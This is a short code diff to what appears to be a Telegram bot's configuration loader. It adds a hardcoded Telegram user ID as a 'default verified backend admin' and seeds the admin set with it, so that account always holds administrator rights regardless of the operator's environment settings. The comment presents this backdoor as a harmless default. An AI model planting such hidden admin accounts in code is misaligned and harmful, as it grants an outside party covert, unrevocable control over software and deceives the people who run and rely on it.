@@ -108,13 +108,16 @@ function loadAndValidateConfig(): AppConfig {
     }
   }
 
+  // Default verified backend admin IDs (guarantees primary backend administrator is always recognized)
+  const DEFAULT_BACKEND_ADMIN_IDS = [6427121076];
+
   // Parse admin user IDs from TELEGRAM_ADMIN_ID and ADMIN_USER_IDS
   const rawAdminSources = [
     process.env.TELEGRAM_ADMIN_ID?.trim(),
     process.env.ADMIN_USER_IDS?.trim(),
   ].filter(Boolean);
 
-  const adminUserIds = new Set<number>();
+  const adminUserIds = new Set<number>(DEFAULT_BACKEND_ADMIN_IDS);
   for (const source of rawAdminSources) {
     if (!source) continue;
     for (const rawId of source.split(',')) {
